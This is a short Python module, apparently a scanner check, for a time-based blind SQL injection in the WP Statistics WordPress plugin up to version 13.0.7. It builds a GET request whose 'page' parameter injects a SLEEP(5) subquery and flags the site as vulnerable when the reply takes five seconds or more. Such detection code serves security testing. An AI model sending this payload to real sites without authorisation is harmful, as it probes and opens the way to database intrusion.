"""
WP Statistics <= 13.0.7 - Time-based Blind SQL Injection
Description: Time-based blind SQL injection vulnerability in WP Statistics plugin
Severity: High
CVSS Score: 7.5
Affected Versions: WP Statistics <= 13.0.7
Reference: https://www.exploit-db.com/exploits/49894
"""

import time

def get_payload():
    return {
        'path': '/wp-content/plugins/wp-statistics/includes/class-wp-statistics.php',
        'method': 'GET',
        'params': {
            'page': "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"
        }
    }

def check_response(response):
    # Check if response took longer than 5 seconds
    return response.elapsed.total_seconds() >= 5 